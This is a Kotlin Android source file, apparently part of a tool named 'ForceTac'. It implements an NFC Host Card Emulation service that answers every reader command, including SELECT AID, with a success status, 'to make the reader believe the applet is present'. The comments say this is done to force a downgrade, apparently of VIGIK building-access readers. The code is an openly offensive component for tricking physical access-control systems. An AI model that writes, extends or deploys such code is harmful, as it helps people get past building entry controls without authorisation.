package com.forcetac

import android.nfc.cardemulation.HostApduService
import android.os.Bundle
import android.util.Log

class HceService : HostApduService() {

    companion object {
        var isDowngradeActive = false
        fun enableDowngradeMode(enable: Boolean) { isDowngradeActive = enable }
    }

    override fun processCommandApdu(commandApdu: ByteArray?, extras: Bundle?): ByteArray {
        if (!isDowngradeActive || commandApdu == null) return byteArrayOf(0x00)

        Log.d("ForceTacHCE", "APDU Reçu: ${bytesToHex(commandApdu)}")

        // Réponse SAK 0x08 (Mifare Classic 1K) simulée pour forcer le downgrade
        // Note: Sur Android standard, nous ne pouvons répondre qu'aux APDUs ISO-7816-4
        // Si le lecteur envoie un SELECT AID (VIGIK ou autre), on répond OK.
        
        // SELECT APDU Header: 00 A4 04 00
        if (commandApdu.size >= 4 && commandApdu[0] == 0x00.toByte() && commandApdu[1] == 0xA4.toByte()) {
            // On répond "OK" (90 00) pour faire croire au lecteur que l'applet est présente
            return byteArrayOf(0x90.toByte(), 0x00.toByte())
        }

        // Pour tout autre commande, on renvoie une réponse générique qui ne ferme pas la connexion
        return byteArrayOf(0x90.toByte(), 0x00.toByte())
    }

    override fun onDeactivated(reason: Int) {
        // Raison 0 = Lien perdu, 1 = Sélection d'une autre AID
        Log.d("ForceTacHCE", "HCE Désactivé: $reason")
        isDowngradeActive = false
    }

    private fun bytesToHex(bytes: ByteArray): String {
        return bytes.joinToString("") { "%02X".format(it) }
    }
}
